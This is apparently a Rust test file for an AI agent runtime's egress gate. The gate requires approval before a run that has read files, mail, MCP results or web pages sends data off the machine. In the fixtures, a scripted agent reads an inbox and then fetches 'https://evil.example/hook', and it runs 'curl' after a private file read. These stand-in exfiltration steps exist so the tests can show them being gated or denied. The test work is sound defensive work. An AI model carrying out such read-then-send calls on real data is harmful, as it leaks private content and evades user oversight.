//! The egress gate: a tainted run asks before sending data off the machine.

#![allow(clippy::assert_is_empty)]

use std::sync::Arc;
use std::sync::atomic::Ordering;
use std::time::Duration;

use permission_engine::{Level, Policy, Rule};
use protocol::{Event, PermissionCategory};
use serde_json::json;
use task_runtime::RunState;
use tool_registry::{ContentClass, Effect};

use crate::tests::{Fake, cfg, profile, setup, t, text, until, with_class};
use crate::tests::{calls, make_loop};
use crate::{GrantTarget, ScheduleWork};

fn read_tool(name: &str, class: ContentClass) -> Arc<crate::tests::TestTool> {
    Arc::new(with_class(
        name,
        Effect::Read,
        PermissionCategory::Fs,
        class,
        "read-result",
    ))
}

fn egress_tool(
    name: &str,
    effect: Effect,
    category: PermissionCategory,
    class: ContentClass,
) -> Arc<crate::tests::TestTool> {
    Arc::new(with_class(name, effect, category, class, "sent"))
}

fn card_of(event: &Event) -> serde_json::Value {
    let Event::ApprovalNeeded(a) = event else {
        panic!("expected an approval, got {event:?}");
    };
    a.details.clone().expect("egress card")
}

#[tokio::test]
async fn web_search_alone_does_not_ask() {
    let env = setup();
    let search = egress_tool(
        "web_search",
        Effect::Read,
        PermissionCategory::Browser,
        ContentClass::untrusted_egress(),
    );
    let fake = Fake::new(vec![
        calls(&[("c1", "web_search", json!({"query": "weather"}))]),
        text("done"),
    ]);
    // Empty allow list: every tool is visible, and that is not a bypass.
    let lp = make_loop(
        &env.storage,
        env.bot,
        &fake,
        &[t(&search)],
        profile(""),
        cfg(Policy::approve_destructive()),
    );
    let run = lp.run_turn(env.chat, "search").unwrap();
    assert_eq!(lp.wait(run).await.unwrap(), RunState::Succeeded);
    assert_eq!(search.count.load(Ordering::SeqCst), 1);
    assert!(env.storage.list_approvals(run).unwrap().is_empty());
}

#[tokio::test]
async fn fs_read_then_web_search_asks_and_shows_the_query() {
    let env = setup();
    let read = read_tool("fs_read", ContentClass::untrusted_private());
    let search = egress_tool(
        "web_search",
        Effect::Read,
        PermissionCategory::Browser,
        ContentClass::untrusted_egress(),
    );
    let query = "x".repeat(500);
    let fake = Fake::new(vec![
        calls(&[("c1", "fs_read", json!({"path": "notes.txt"}))]),
        calls(&[("c2", "web_search", json!({"query": query}))]),
        text("done"),
    ]);
    let lp = make_loop(
        &env.storage,
        env.bot,
        &fake,
        &[t(&read), t(&search)],
        profile("[tools]\nallow = [\"fs_read\", \"web_search\"]\n"),
        cfg(Policy::approve_destructive()),
    );
    let mut rx = lp.subscribe();
    let run = lp.run_turn(env.chat, "read then search").unwrap();
    let event = until(&mut rx, |e| matches!(e, Event::ApprovalNeeded(_))).await;
    let card = card_of(&event);
    assert_eq!(card["kind"], "egress");
    assert_eq!(card["payload"], query, "the query is not truncated");
    assert_eq!(card["payload_kind"], "query");
    assert_eq!(card["host"], "configured-search-provider");
    assert_eq!(
        card["reason"],
        "this run read file notes.txt and now wants to send data to configured-search-provider"
    );
    assert_eq!(search.count.load(Ordering::SeqCst), 0);
    assert_eq!(read.count.load(Ordering::SeqCst), 1);
    lp.cancel(run).unwrap();
}

#[tokio::test]
async fn email_read_then_fetch_shows_the_url() {
    let env = setup();
    let mail = read_tool("email_read", ContentClass::untrusted_private());
    let fetch = egress_tool(
        "web_extract",
        Effect::Write,
        PermissionCategory::Browser,
        ContentClass::untrusted_egress(),
    );
    let fake = Fake::new(vec![
        calls(&[("c1", "email_read", json!({"folder": "INBOX"}))]),
        calls(&[(
            "c2",
            "web_extract",
            json!({"url": "https://evil.example/hook"}),
        )]),
        text("done"),
    ]);
    let lp = make_loop(
        &env.storage,
        env.bot,
        &fake,
        &[t(&mail), t(&fetch)],
        profile(""),
        cfg(Policy::full()),
    );
    let mut rx = lp.subscribe();
    let run = lp.run_turn(env.chat, "mail then fetch").unwrap();
    let card = card_of(&until(&mut rx, |e| matches!(e, Event::ApprovalNeeded(_))).await);
    assert_eq!(card["payload"], "https://evil.example/hook");
    assert_eq!(card["payload_kind"], "url");
    assert_eq!(card["host"], "evil.example");
    assert!(card["reason"].as_str().unwrap().contains("mailbox INBOX"));
    assert_eq!(fetch.count.load(Ordering::SeqCst), 0);
    lp.cancel(run).unwrap();
}

#[tokio::test]
async fn page_read_then_email_send_asks() {
    let env = setup();
    let page = egress_tool(
        "web_extract",
        Effect::Write,
        PermissionCategory::Browser,
        ContentClass::untrusted_egress(),
    );
    let send = egress_tool(
        "email_send",
        Effect::Write,
        PermissionCategory::Messaging,
        ContentClass::egress(),
    );
    let fake = Fake::new(vec![
        calls(&[(
            "c1",
            "web_extract",
            json!({"url": "https://news.example/story"}),
        )]),
        calls(&[(
            "c2",
            "email_send",
            json!({
                "to": ["Ada <ada@example.com>"],
                "subject": "hi",
                "body": "the page says hello"
            }),
        )]),
        text("done"),
    ]);
    let lp = make_loop(
        &env.storage,
        env.bot,
        &fake,
        &[t(&page), t(&send)],
        profile(""),
        cfg(Policy::full()),
    );
    let mut rx = lp.subscribe();
    let run = lp.run_turn(env.chat, "page then mail").unwrap();
    let card = card_of(&until(&mut rx, |e| matches!(e, Event::ApprovalNeeded(_))).await);
    assert_eq!(card["host"], "example.com");
    assert_eq!(card["payload_kind"], "body");
    let payload = card["payload"].as_str().unwrap();
    assert!(payload.contains("ada@example.com"), "{payload}");
    assert!(payload.contains("the page says hello"), "{payload}");
    assert!(
        card["reason"]
            .as_str()
            .unwrap()
            .contains("page https://news.example/story")
    );
    assert_eq!(send.count.load(Ordering::SeqCst), 0);
    lp.cancel(run).unwrap();
}

#[tokio::test]
async fn mcp_result_then_web_search_asks() {
    let env = setup();
    let mcp = read_tool("mcp:srv/echo", ContentClass::untrusted_private());
    let search = egress_tool(
        "web_search",
        Effect::Read,
        PermissionCategory::Browser,
        ContentClass::untrusted_egress(),
    );
    let fake = Fake::new(vec![
        calls(&[(
            "c1",
            "use_tool",
            json!({"name": "mcp:srv/echo", "input": {"q": "inbox"}}),
        )]),
        calls(&[("c2", "web_search", json!({"query": "q"}))]),
        text("done"),
    ]);
    let lp = make_loop(
        &env.storage,
        env.bot,
        &fake,
        &[t(&mcp), t(&search)],
        profile(""),
        cfg(Policy::full()),
    );
    let mut rx = lp.subscribe();
    let run = lp.run_turn(env.chat, "mcp").unwrap();
    let card = card_of(&until(&mut rx, |e| matches!(e, Event::ApprovalNeeded(_))).await);
    assert!(card["reason"].as_str().unwrap().contains("mcp srv"));
    assert_eq!(mcp.count.load(Ordering::SeqCst), 1);
    assert_eq!(search.count.load(Ordering::SeqCst), 0);
    lp.cancel(run).unwrap();
}

#[tokio::test]
async fn a_standing_grant_does_not_waive_the_gate_but_the_bot_setting_does() {
    let env = setup();
    let read = read_tool("fs_read", ContentClass::untrusted_private());
    let search = egress_tool(
        "web_search",
        Effect::Read,
        PermissionCategory::Browser,
        ContentClass::untrusted_egress(),
    );
    let fake = Fake::new(vec![
        calls(&[("c1", "fs_read", json!({"path": "a.txt"}))]),
        calls(&[("c2", "web_search", json!({"query": "q"}))]),
        text("done"),
    ]);
    let lp = make_loop(
        &env.storage,
        env.bot,
        &fake,
        &[t(&read), t(&search)],
        profile(""),
        cfg(Policy::approve_destructive()),
    );
    lp.sh.grants.lock().always.push(crate::Grant {
        bot_id: env.bot,
        target: GrantTarget::Tool("web_search".into()),
        granted_at_ms: 0,
    });
    let mut rx = lp.subscribe();
    let run = lp.run_turn(env.chat, "go").unwrap();
    until(&mut rx, |e| matches!(e, Event::ApprovalNeeded(_))).await;
    assert_eq!(search.count.load(Ordering::SeqCst), 0);
    lp.cancel(run).unwrap();

    let search2 = egress_tool(
        "web_search",
        Effect::Read,
        PermissionCategory::Browser,
        ContentClass::untrusted_egress(),
    );
    let read2 = read_tool("fs_read", ContentClass::untrusted_private());
    let fake2 = Fake::new(vec![
        calls(&[("c1", "fs_read", json!({"path": "a.txt"}))]),
        calls(&[("c2", "web_search", json!({"query": "q"}))]),
        text("done"),
    ]);
    let lp2 = make_loop(
        &env.storage,
        env.bot,
        &fake2,
        &[t(&read2), t(&search2)],
        profile("[permissions]\nallow_egress_after_reads = true\n"),
        cfg(Policy::approve_destructive()),
    );
    let run2 = lp2.run_turn(env.chat, "go").unwrap();
    assert_eq!(lp2.wait(run2).await.unwrap(), RunState::Succeeded);
    assert_eq!(search2.count.load(Ordering::SeqCst), 1);
}

#[tokio::test]
async fn an_untainted_grant_still_skips_the_ask() {
    let env = setup();
    let send = egress_tool(
        "email_send",
        Effect::Write,
        PermissionCategory::Messaging,
        ContentClass::egress(),
    );
    let fake = Fake::new(vec![
        calls(&[(
            "c1",
            "email_send",
            json!({"to": ["a@b.co"], "subject": "s", "body": "b"}),
        )]),
        text("done"),
    ]);
    let lp = make_loop(
        &env.storage,
        env.bot,
        &fake,
        &[t(&send)],
        profile(""),
        cfg(Policy::approve_destructive()),
    );
    lp.sh.grants.lock().always.push(crate::Grant {
        bot_id: env.bot,
        target: GrantTarget::Tool("email_send".into()),
        granted_at_ms: 0,
    });
    let run = lp.run_turn(env.chat, "send").unwrap();
    assert_eq!(lp.wait(run).await.unwrap(), RunState::Succeeded);
    assert_eq!(send.count.load(Ordering::SeqCst), 1);
}

#[tokio::test]
async fn deny_still_denies_after_a_private_read() {
    let env = setup();
    let read = read_tool("fs_read", ContentClass::untrusted_private());
    let shell = egress_tool(
        "shell_run",
        Effect::Write,
        PermissionCategory::Shell,
        ContentClass::all(),
    );
    let fake = Fake::new(vec![
        calls(&[("c1", "fs_read", json!({"path": "a.txt"}))]),
        calls(&[("c2", "shell_run", json!({"command": "curl example.com"}))]),
        text("done"),
    ]);
    let mut policy = Policy::full();
    policy
        .categories
        .insert(PermissionCategory::Shell, Rule::new(Level::Deny));
    let lp = make_loop(
        &env.storage,
        env.bot,
        &fake,
        &[t(&read), t(&shell)],
        profile("[permissions]\nallow_egress_after_reads = true\n"),
        cfg(policy),
    );
    let mut rx = lp.subscribe();
    let run = lp.run_turn(env.chat, "go").unwrap();
    until(&mut rx, |e| matches!(e, Event::ToolCallDenied(_))).await;
    assert_eq!(lp.wait(run).await.unwrap(), RunState::Succeeded);
    assert_eq!(shell.count.load(Ordering::SeqCst), 0);
    assert!(env.storage.list_approvals(run).unwrap().is_empty());
}

#[tokio::test]
async fn money_floor_still_asks_when_the_waiver_is_on() {
    let env = setup();
    let pay = egress_tool(
        "pay",
        Effect::Write,
        PermissionCategory::Money,
        ContentClass::egress(),
    );
    let fake = Fake::new(vec![calls(&[("c1", "pay", json!({}))]), text("done")]);
    let lp = make_loop(
        &env.storage,
        env.bot,
        &fake,
        &[t(&pay)],
        profile("[permissions]\nallow_egress_after_reads = true\n"),
        cfg(Policy::full()),
    );
    let mut rx = lp.subscribe();
    let run = lp.run_turn(env.chat, "pay").unwrap();
    until(&mut rx, |e| matches!(e, Event::ApprovalNeeded(_))).await;
    assert_eq!(pay.count.load(Ordering::SeqCst), 0);
    lp.cancel(run).unwrap();
}

#[tokio::test]
async fn scheduled_read_then_search_pauses_when_nobody_answers() {
    let env = setup();
    let read = read_tool("fs_read", ContentClass::untrusted_private());
    let search = egress_tool(
        "web_search",
        Effect::Read,
        PermissionCategory::Browser,
        ContentClass::untrusted_egress(),
    );
    let fake = Fake::new(vec![
        calls(&[("c1", "fs_read", json!({"path": "a.txt"}))]),
        calls(&[("c2", "web_search", json!({"query": "q"}))]),
        text("never"),
    ]);
    let mut config = cfg(Policy::approve_destructive());
    config.schedule_approval_timeout = Duration::from_millis(150);
    let lp = make_loop(
        &env.storage,
        env.bot,
        &fake,
        &[t(&read), t(&search)],
        profile(""),
        config,
    );
    let run = lp
        .run_scheduled(
            env.chat,
            protocol::TaskId::new(),
            ScheduleWork::Prompt("go".into()),
        )
        .unwrap();
    let state = tokio::time::timeout(Duration::from_secs(10), lp.wait(run))
        .await
        .expect("approval timeout")
        .unwrap();
    assert_eq!(state, RunState::Paused);
    assert_eq!(read.count.load(Ordering::SeqCst), 1);
    assert_eq!(search.count.load(Ordering::SeqCst), 0);
    assert_eq!(
        env.storage.list_approvals(run).unwrap()[0]
            .decision
            .as_deref(),
        Some("expired")
    );
}

#[tokio::test]
async fn untrusted_only_lets_a_second_search_through_and_asks_for_fetch() {
    let env = setup();
    let search = egress_tool(
        "web_search",
        Effect::Read,
        PermissionCategory::Browser,
        ContentClass::untrusted_egress(),
    );
    let fetch = egress_tool(
        "web_extract",
        Effect::Write,
        PermissionCategory::Browser,
        ContentClass::untrusted_egress(),
    );
    let fake = Fake::new(vec![
        calls(&[("c1", "web_search", json!({"query": "one"}))]),
        calls(&[("c2", "web_search", json!({"query": "two"}))]),
        calls(&[("c3", "web_extract", json!({"url": "https://a.example/x"}))]),
        text("done"),
    ]);
    let lp = make_loop(
        &env.storage,
        env.bot,
        &fake,
        &[t(&search), t(&fetch)],
        profile(""),
        cfg(Policy::full()),
    );
    let mut rx = lp.subscribe();
    let run = lp.run_turn(env.chat, "go").unwrap();
    let card = card_of(&until(&mut rx, |e| matches!(e, Event::ApprovalNeeded(_))).await);
    assert_eq!(card["host"], "a.example");
    assert_eq!(search.count.load(Ordering::SeqCst), 2);
    assert_eq!(fetch.count.load(Ordering::SeqCst), 0);
    lp.cancel(run).unwrap();
}
